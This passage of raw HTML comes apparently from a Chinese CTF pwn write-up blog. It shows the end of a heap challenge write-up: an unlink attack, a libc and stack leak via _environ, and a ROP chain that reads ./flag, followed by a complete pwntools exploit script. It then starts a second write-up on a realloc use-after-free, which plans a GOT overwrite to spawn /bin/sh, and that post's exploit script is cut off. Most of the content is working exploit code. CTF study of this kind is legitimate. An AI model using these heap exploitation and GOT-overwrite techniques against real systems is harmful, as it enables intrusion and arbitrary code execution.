prev_size</span></span><br><span class="line">p += <span class="string">&#x27;\x90&#x27;</span> <span class="comment"># size</span></span><br><span class="line">md(<span class="number">3</span>, p)</span><br><span class="line">rm(<span class="number">4</span>) <span class="comment"># 合并堆块,触发unlink</span></span><br></pre></td></tr></table></figure>

<h4 id="获取stack地址"><a href="#获取stack地址" class="headerlink" title="获取stack地址"></a>获取stack地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak stack</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">in exe</span></span><br><span class="line"><span class="string">4023b3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">4023b1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">400711 : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">in libc</span></span><br><span class="line"><span class="string">0x33544 : pop rax ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">read</span></span><br><span class="line"><span class="string">1 RDI  0x0</span></span><br><span class="line"><span class="string">2 RSI  0x7fffffffec18 —▸ 0x402327 </span></span><br><span class="line"><span class="string">3 RDX  0x78</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rdi = <span class="number">0x4023b3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4023b1</span></span><br><span class="line">ret = <span class="number">0x400711</span></span><br><span class="line">pop_rax = lib.address + <span class="number">0x33544</span></span><br><span class="line">pop_rdx = lib.address + <span class="number">0x1b92</span></span><br><span class="line"></span><br><span class="line">md(<span class="number">3</span>, p64(lib.sym[<span class="string">&#x27;_environ&#x27;</span>])) <span class="comment"># 将管理chunk 0的指针改为 libc中的_environ地址</span></span><br><span class="line">dp(<span class="number">0</span>)</span><br><span class="line">environ = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) <span class="comment"># 泄漏stack中的environ地址 </span></span><br><span class="line">li(<span class="string">&#x27;environ &#x27;</span> + <span class="built_in">hex</span>(environ))</span><br><span class="line">md_ret = environ - (<span class="number">0xee38</span> - <span class="number">0xec18</span>) <span class="comment"># 计算 修改功能的ret地址</span></span><br><span class="line">li(<span class="string">&#x27;md_ret &#x27;</span> + <span class="built_in">hex</span>(md_ret))</span><br></pre></td></tr></table></figure>

<h4 id="构造rop链"><a href="#构造rop链" class="headerlink" title="构造rop链"></a>构造rop链</h4><p>通过open, read, puts函数实现flag的打印</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">md(<span class="number">3</span>, p64(md_ret))</span><br><span class="line">puts_plt = exe.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment"># creat rop</span></span><br><span class="line">flag = md_ret + <span class="number">0x8</span> * <span class="number">19</span></span><br><span class="line">p = p64(pop_rdi) + p64(flag)</span><br><span class="line">p += p64(pop_rsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p += p64(pop_rdx) + p64(<span class="number">0</span>)</span><br><span class="line">p += p64(lib.sym[<span class="string">&#x27;open&#x27;</span>]) <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read</span></span><br><span class="line">p += p64(pop_rdi) + p64(<span class="number">0x3</span>)</span><br><span class="line">p += p64(pop_rsi_r15) + p64(flag) + p64(<span class="number">0</span>)</span><br><span class="line">p += p64(pop_rdx) + p64(<span class="number">0x60</span>)</span><br><span class="line">p += p64(lib.sym[<span class="string">&#x27;read&#x27;</span>]) <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line">p += p64(pop_rdi) + p64(flag)</span><br><span class="line">p += p64(lib.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">p += <span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#db()</span></span><br><span class="line">sa(<span class="string">&#x27;?&#x27;</span>, p)</span><br></pre></td></tr></table></figure>

<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;lgd&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"><span class="comment">#libFile = &#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">remotePort = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;_?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;no?&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;?&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))	</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;name?&#x27;</span>, <span class="string">&#x27;I0gan&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x100</span>) <span class="comment"># idx 0</span></span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x78</span>) <span class="comment"># idx 1</span></span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x78</span>) <span class="comment"># idx 2</span></span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x78</span>) <span class="comment"># idx 3</span></span><br><span class="line"></span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x60</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0xe1</span>)</span><br><span class="line">	md(<span class="number">0</span>, p)</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x78</span>)</span><br><span class="line">	dp(<span class="number">2</span>)</span><br><span class="line">	lib.address = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">	li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># recover bin</span></span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x60</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0x71</span>)</span><br><span class="line">	md(<span class="number">0</span>, p)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># unlink attack to list</span></span><br><span class="line">	ad(<span class="number">0x80</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment">#idx 4</span></span><br><span class="line">	<span class="comment"># fake chunk</span></span><br><span class="line">	plist = <span class="number">0x6032f8</span></span><br><span class="line">	p = p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0x61</span>)</span><br><span class="line">	p += p64(plist - <span class="number">0x18</span>)</span><br><span class="line">	p += p64(plist - <span class="number">0x10</span>)</span><br><span class="line">	p += p64(<span class="number">0x60</span>)</span><br><span class="line">	p = p.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	p += p64(<span class="number">0x60</span>)</span><br><span class="line">	p += <span class="string">&#x27;\x90&#x27;</span></span><br><span class="line">	md(<span class="number">3</span>, p)</span><br><span class="line">	rm(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak stack</span></span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	in exe</span></span><br><span class="line"><span class="string">	4023b3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">	4023b1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">	400711 : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	in libc</span></span><br><span class="line"><span class="string">	0x33544 : pop rax ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	read</span></span><br><span class="line"><span class="string">	1 RDI  0x0</span></span><br><span class="line"><span class="string">	2 RSI  0x7fffffffec18 —▸ 0x402327 </span></span><br><span class="line"><span class="string">	3 RDX  0x78</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	pop_rdi = <span class="number">0x4023b3</span></span><br><span class="line">	pop_rsi_r15 = <span class="number">0x4023b1</span></span><br><span class="line">	ret = <span class="number">0x400711</span></span><br><span class="line">	pop_rax = lib.address + <span class="number">0x33544</span></span><br><span class="line">	pop_rdx = lib.address + <span class="number">0x1b92</span></span><br><span class="line"></span><br><span class="line">	md(<span class="number">3</span>, p64(lib.sym[<span class="string">&#x27;_environ&#x27;</span>]))</span><br><span class="line">	dp(<span class="number">0</span>)</span><br><span class="line">	environ = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	li(<span class="string">&#x27;environ &#x27;</span> + <span class="built_in">hex</span>(environ))</span><br><span class="line">	md_ret = environ - (<span class="number">0xee38</span> - <span class="number">0xec18</span>)</span><br><span class="line">	li(<span class="string">&#x27;md_ret &#x27;</span> + <span class="built_in">hex</span>(md_ret))</span><br><span class="line"></span><br><span class="line">	md(<span class="number">3</span>, p64(md_ret))</span><br><span class="line">	puts_plt = exe.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	<span class="comment"># creat rop</span></span><br><span class="line">	flag = md_ret + <span class="number">0x8</span> * <span class="number">19</span></span><br><span class="line">	p = p64(pop_rdi) + p64(flag)</span><br><span class="line">	p += p64(pop_rsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(pop_rdx) + p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(lib.sym[<span class="string">&#x27;open&#x27;</span>]) <span class="comment"># 8</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># read</span></span><br><span class="line">	p += p64(pop_rdi) + p64(<span class="number">0x3</span>)</span><br><span class="line">	p += p64(pop_rsi_r15) + p64(flag) + p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(pop_rdx) + p64(<span class="number">0x60</span>)</span><br><span class="line">	p += p64(lib.sym[<span class="string">&#x27;read&#x27;</span>]) <span class="comment"># 8</span></span><br><span class="line">	</span><br><span class="line">	p += p64(pop_rdi) + p64(flag)</span><br><span class="line">	p += p64(lib.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">	p += <span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	sa(<span class="string">&#x27;?&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/04/03/wp-%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9/" data-id="ckhemv850005zwdcm906jeyv7" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-supermarket" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/03/wp-supermarket/" class="article-date">
  <time datetime="2020-04-03T03:54:26.000Z" itemprop="datePublished">2020-04-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/03/wp-supermarket/">wp supermarket</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="SuperMaket"><a href="#SuperMaket" class="headerlink" title="SuperMaket"></a>SuperMaket</h1><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点:"></a>漏洞点:</h3><p>添加和删除基本上没有十分严密, 找不到漏洞, 输入的长度且必须是n - 1, 不存在 off by one.然而在修改description的时候,当新的大小与以前大小不同时, 就会realloc重新分配内存.但没有跟新list数组中的指针.若重新分配大的话, 就造成use after free.</p>
<p>简要说一下 realloc函数吧:</p>
<p>extern void *realloc(void *mem_address, unsigned int newsize);</p>
<p>realloc会根据newsize大小来判断怎样分配新的内存, 并却将原来的数据拷贝到新分配的内存中.</p>
<p>realloc包含了 malloc, free, memcpy三个函数功能, 若新的大小过大的时候, 且在相邻chunk没有空间可分配, 这时候,系统就会去找一个空间够的地方来开辟内存, 这时候就可能涉及到这三个函数的功能. malloc新的内存, mcmcpy拷贝数据, free掉以前的chunk.</p>
<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码:"></a>漏洞代码:</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( size = <span class="number">0</span>; size &lt;= <span class="number">0</span> || size &gt; <span class="number">256</span>; size = inputNum() )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;descrip_size:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)(&amp;list_0)[v1] + <span class="number">5</span>) != size )</span><br><span class="line">    <span class="built_in">realloc</span>(*((<span class="keyword">void</span> **)(&amp;list_0)[v1] + <span class="number">6</span>), size); <span class="comment">//漏洞点</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;description:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> inputName(*((_DWORD *)(&amp;list_0)[v1] + <span class="number">6</span>), *((_DWORD *)(&amp;list_0)[v1] + <span class="number">5</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路:"></a>整体思路:</h3><h4 id="获得libc的基地址"><a href="#获得libc的基地址" class="headerlink" title="获得libc的基地址:"></a>获得libc的基地址:</h4><p>利用这个漏洞来修改free函数的got表为puts, 传入参数为atoi函数的got地址.调用free时, 获得atoi在libc中的地址.计算偏移即可</p>
<h4 id="调用system"><a href="#调用system" class="headerlink" title="调用system."></a>调用system.</h4><p>获得libc地址之后, 也利用这个漏洞修改atoi的got表地址为system地址.然后在进行选择的时候直接传入参数 ‘/bin/sh’即可获得shell.当然还可以继续修改free的got地址为system.但需要得到’/bin/sh’在libc中的地址, 且在chunk头的decription地址中写入该地址.调用free也行, 我试过了, system虽然能调用成功, 就是这个’/bin/sh’在libc中的偏移有问题. 结果 就是sh :cmd not found</p>
<p>以上就是整体思路:</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"><span class="comment"># Team  : D0g3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, 